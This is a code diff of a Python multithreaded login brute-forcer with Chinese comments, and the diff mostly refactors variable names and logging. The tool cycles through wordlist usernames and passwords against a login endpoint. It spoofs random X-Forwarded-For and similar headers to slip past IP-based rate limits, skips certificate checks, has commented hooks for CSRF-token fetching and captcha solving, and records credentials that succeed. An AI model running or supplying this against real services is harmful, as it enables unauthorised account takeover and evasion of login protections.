@@ -32,10 +32,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 USERNAME = ["admin"]   # USERNAME = USERNAME + USERNAME_FILE_PATH + USERPASS_FILE_PATH[0]
 PASSWORD = ["123456"]  # PASSWORD = PASSWORD + PASSWORD_FILE_PATH + USERPASS_FILE_PATH[1]
 
-# 字典文件路径，代码被注释、空字符串或None就不读取
-USERNAME_FILE_PATH = r"username.txt"
-PASSWORD_FILE_PATH = r"password.txt"
-USERPASS_FILE_PATH = r"userpass.txt"
+# 字典文件路径，代码被注释、空字符串或None就不会读取
+#USERNAME_FILE_PATH = r"username.txt"
+#PASSWORD_FILE_PATH = r"password.txt"
+#USERPASS_FILE_PATH = r"userpass.txt"
 
 # 只爆破一个账号
 ONLY_ONCE = False
@@ -94,20 +94,14 @@ if 'USERPASS_FILE_PATH' in vars() and USERPASS_FILE_PATH:
 # =================== [ 爆破结果 ] ===================
 #
 
-FOUND_OUTPUT_PATH = "found.txt"
-FOUND_OUTPUT_LOCK = threading.Lock() # 文件互斥锁
+FOUND_PATH = "found.txt"
+FOUND_LOCK = threading.Lock() # 文件互斥锁
 
-EXCEPTION_OUTPUT_PATH = "exception.txt"
-EXCEPTION_OUTPUT_LOCK = threading.Lock() # 文件互斥锁
-
-with open(FOUND_OUTPUT_PATH, "a", encoding="utf-8") as fout:
-    fout.write(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
-
-with open(EXCEPTION_OUTPUT_PATH, "a", encoding="utf-8") as fout:
-    fout.write(f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+EXCEPTION_PATH = "exception.txt"
+EXCEPTION_LOCK = threading.Lock() # 文件互斥锁
 
 # 写入文件函数，末尾的换行符需要自行处理
-def write_to_file(path: str, lock, text: str):
+def log(path: str, lock, text: str):
     with lock:
         with open(path, "a", encoding="utf-8") as fout:
             fout.write(text)
@@ -204,33 +198,28 @@ def Base64_encode(message: str) -> str:
 # =================== [ 爆破函数 ] ===================
 #
 
-# 设置Headers
-HEADERS = requests.utils.default_headers()
-HEADERS.update({
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
-    "Connection": "close",
-})
-
-# 设置Cookies
-COOKIES = {
-    'SESSIONID': '',
-}
-
 # 爆破函数，返回 (no_exception, found_password)
 def run(username, password):
-
-    # 生成随机IP
-    IP = ".".join(str(random.randint(0,255)) for _ in range(4))
-    HEADERS.update({
-        "X-Forwarded-For": IP,
-        "X-Originating-IP": IP,
-        "X-Remote-IP": IP,
-        "X-Remote-Addr": IP,
-        "X-Real-IP": IP
-    })
-
     time.sleep(DELAY)
 
+    # 伪造 XFF
+    random_ip = ".".join(str(random.randint(0,255)) for _ in range(4))
+    headers = requests.utils.default_headers()
+    headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+        "Connection": "close",
+        "X-Forwarded-For": random_ip,
+        "X-Originating-IP": random_ip,
+        "X-Remote-IP": random_ip,
+        "X-Remote-Addr": random_ip,
+        "X-Real-IP": random_ip
+    })
+
+    # 设置Cookies
+    cookies = {
+        'SESSIONID': '',
+    }
+    
     try:
         url = "https://example.com"
         session = requests.Session()
@@ -242,7 +231,7 @@ def run(username, password):
         while True:
             # 可以先用 session 请求一次 CSRF Token / Cookie 再发起登录请求
             #response = session.get(url + "/login.html",
-            #    headers=HEADERS, cookies=COOKIES, timeout=10, 
+            #    headers=headers, cookies=cookies, timeout=10, 
             #    allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
             #html = etree.HTML(response.text, etree.HTMLParser())
             #token = html.xpath('//input[@type="hidden" and @id="csrf"]/@value')[0]
@@ -257,7 +246,7 @@ def run(username, password):
             
             # 验证码识别
             # response = session.get(url + "/login/vcode",
-            #     headers=HEADERS, cookies=COOKIES, timeout=10, 
+            #     headers=headers, cookies=cookies, timeout=10, 
             #     allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
             # captcha = captchadet.identify(MODEL, response.content)
 
@@ -266,7 +255,7 @@ def run(username, password):
                 "password": password
             }
             response = session.post(url + "/login.html",
-                data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
+                data=data, headers=headers, cookies=cookies, timeout=10, 
                 allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
             
             if response.status_code == 502:
@@ -294,22 +283,22 @@ def run(username, password):
         
         # 找到密码
         output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
-        write_to_file(FOUND_OUTPUT_PATH, FOUND_OUTPUT_LOCK, f"{output}\n")
+        log(FOUND_PATH, FOUND_LOCK, f"{output}\n")
         print(output)
         return True, True
 
     except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
-        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
+        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
         return False, False
     
     except MaxRetryError as e: # 大概率是 selenium 引起的异常
-        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
+        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} Selenium has crashed or has been manually closed")
         return False, False
 
     except Exception as e:
-        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
+        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
         print(traceback.format_exc())
         return False, False
@@ -367,21 +356,21 @@ def callback(future):
 # 并发运行爆破函数
 def concurrent_run(executor):
     global THREAD_POOL_STOP_SIGNAL, TASKS, FINISHED_COUNT
-    
+
     for password in PASSWORD:
+        password = password.rstrip()
+        if not password:
+            continue
         for username in USERNAME:
+            username = username.rstrip()
+            if not username:
+                continue
             # 如果队列过长就等待
             if len(TASKS) >= THREADS:
                 _, TASKS = futures.wait(TASKS, return_when=futures.FIRST_COMPLETED)
-
             # 检查是否需要退出
             if THREAD_POOL_STOP_SIGNAL == True:
                 return
-
-            # 清除右边的换行
-            username = username.rstrip()
-            password = password.rstrip()
-            
             # 新建线程
             t = executor.submit(run, username, password)
             t.add_done_callback(callback)
@@ -412,6 +401,10 @@ def report_elapsed_time():
 # 启动进度报告线程
 REPORT_THREAD = threading.Thread(target=report_elapsed_time)
 REPORT_THREAD.start()
+
+# 日志记录时间
+log(FOUND_PATH, FOUND_LOCK, f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+log(EXCEPTION_PATH, EXCEPTION_LOCK, f"\n# Begin at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
 
 # 线程池
 with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
